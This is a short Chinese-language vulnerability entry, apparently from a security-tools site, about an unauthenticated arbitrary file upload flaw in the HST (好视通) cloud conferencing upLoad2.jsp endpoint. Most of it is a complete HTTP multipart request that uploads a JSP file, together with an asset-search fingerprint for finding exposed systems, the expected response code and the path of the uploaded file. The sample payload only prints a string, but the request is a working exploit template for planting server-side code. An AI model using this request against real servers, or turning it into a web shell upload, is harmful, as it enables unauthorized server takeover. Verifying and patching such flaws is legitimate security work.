﻿# 好视通云会议 upLoad2.jsp 任意文件上传漏洞

> 更新时间：2023-12-07

> 漏洞编号：

> 漏洞说明： 好视通云会议/fm/systemConfig/upLoad2.jsp接口处存在任意文件上传漏洞，未经身份认证的攻击者可以通过此漏洞上传恶意后门文件，最终可获取服务器权限。

> 漏洞特征：app:"好视通-云会议"

> 验证脚本：HTTP

```
POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
Accept-Encoding: gzip
 
--1515df1sdfdsfddfs
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
 
<% out.print("dudesuite"); %>
--1515df1sdfdsfddfs--
```

> 响应代码特征：302

> 响应内容特征：

> 上传文件定位：/fm/upload/dudesuite.jsp

> 验证文件来源：Dude Suite Web Security Tools - https://www.dudesuite.cn - 转载请注明出处
